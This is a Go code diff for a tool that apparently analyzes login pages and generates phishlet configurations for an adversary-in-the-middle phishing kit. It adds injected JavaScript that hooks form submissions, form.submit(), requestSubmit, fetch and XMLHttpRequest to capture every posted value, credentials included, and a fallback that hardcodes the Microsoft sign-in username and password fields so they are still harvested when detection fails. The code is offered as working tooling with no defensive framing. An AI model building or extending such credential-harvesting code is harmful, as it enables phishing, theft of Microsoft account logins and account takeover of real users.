@@ -425,8 +425,9 @@ func (a *Analyzer) handleResponse(sess *AnalyzerSession, e *network.EventRespons
 // JavaScript snippet injected into the page to reliably capture POST data.
 // CDP network events often fail to capture form POST bodies for navigation
 // requests because the page unloads before the data can be read. This script
-// intercepts form submissions, fetch(), and XMLHttpRequest.send() and stores
-// the data in sessionStorage (which survives navigation).
+// intercepts ALL form submissions (including programmatic form.submit() which
+// does NOT fire the DOM submit event), fetch(), and XMLHttpRequest.send().
+// Captured data is stored in sessionStorage which survives page navigation.
 const postCaptureJS = `(function(){
 	if(window.__postHooked) return;
 	window.__postHooked = true;
@@ -437,14 +438,36 @@ const postCaptureJS = `(function(){
 			sessionStorage.setItem('__pc', JSON.stringify(arr));
 		} catch(x){}
 	}
-	document.addEventListener('submit', function(e) {
+	function captureForm(form) {
 		try {
-			var fd = new FormData(e.target);
+			var fd = new FormData(form);
 			var obj = {};
 			fd.forEach(function(v,k){ obj[k] = String(v); });
-			save({u: e.target.action || location.href, d: JSON.stringify(obj), t: 'form'});
+			var url = form.action || location.href;
+			save({u: url, d: JSON.stringify(obj), t: 'form'});
 		} catch(x){}
+	}
+	// Patch HTMLFormElement.prototype.submit — this is the critical one.
+	// Microsoft (and many sites) create hidden forms in JS and call
+	// form.submit() programmatically. This does NOT fire the submit event.
+	var _formSubmit = HTMLFormElement.prototype.submit;
+	HTMLFormElement.prototype.submit = function() {
+		captureForm(this);
+		return _formSubmit.apply(this, arguments);
+	};
+	// Also patch requestSubmit (fires submit event, but patch for safety)
+	if(HTMLFormElement.prototype.requestSubmit) {
+		var _reqSubmit = HTMLFormElement.prototype.requestSubmit;
+		HTMLFormElement.prototype.requestSubmit = function() {
+			captureForm(this);
+			return _reqSubmit.apply(this, arguments);
+		};
+	}
+	// DOM submit event listener (for user-initiated submissions via Enter key etc.)
+	document.addEventListener('submit', function(e) {
+		captureForm(e.target);
 	}, true);
+	// Intercept fetch()
 	var _f = window.fetch;
 	window.fetch = function(u, o) {
 		try {
@@ -454,6 +477,7 @@ const postCaptureJS = `(function(){
 		} catch(x){}
 		return _f.apply(this, arguments);
 	};
+	// Intercept XMLHttpRequest
 	var _s = XMLHttpRequest.prototype.send;
 	var _o = XMLHttpRequest.prototype.open;
 	XMLHttpRequest.prototype.open = function(m, u) {
@@ -1135,6 +1159,32 @@ func (a *Analyzer) Analyze(sess *AnalyzerSession) *AnalysisResult {
 		}
 	}
 
+	// Known-service credential fallback: if we recognized the login domain
+	// but failed to capture credentials, use known field names.
+	if len(result.Credentials) == 0 || (!hasUsernameField(result) && !hasPasswordField(result)) {
+		for _, ds := range sess.domains {
+			if strings.Contains(ds.Domain, "microsoftonline.com") || strings.Contains(ds.Domain, "login.live.com") {
+				if !hasUsernameField(result) {
+					result.Credentials = append(result.Credentials, AnalyzedCredential{
+						Name: "username", Key: "loginfmt", Search: "(.*)", FieldType: "post",
+					})
+					log.Info("analyzer [%d]: using known Microsoft username field: loginfmt", sess.Id)
+				}
+				if !hasPasswordField(result) {
+					result.Credentials = append(result.Credentials, AnalyzedCredential{
+						Name: "password", Key: "passwd", Search: "(.*)", FieldType: "post",
+					})
+					log.Info("analyzer [%d]: using known Microsoft password field: passwd", sess.Id)
+				}
+				if result.LoginDomain == "" || result.LoginDomain == landingDomain {
+					result.LoginDomain = "login.microsoftonline.com"
+					result.LoginPath = "/common/login"
+				}
+				break
+			}
+		}
+	}
+
 	// Fallback login path
 	if result.LoginDomain == "" {
 		result.LoginDomain = landingDomain
@@ -1147,6 +1197,24 @@ func (a *Analyzer) Analyze(sess *AnalyzerSession) *AnalysisResult {
 
 	sess.Status = "done"
 	return result
+}
+
+func hasUsernameField(r *AnalysisResult) bool {
+	for _, c := range r.Credentials {
+		if c.Name == "username" {
+			return true
+		}
+	}
+	return false
+}
+
+func hasPasswordField(r *AnalysisResult) bool {
+	for _, c := range r.Credentials {
+		if c.Name == "password" {
+			return true
+		}
+	}
+	return false
 }
 
 // GenerateYAML produces a phishlet YAML string from the analysis result.
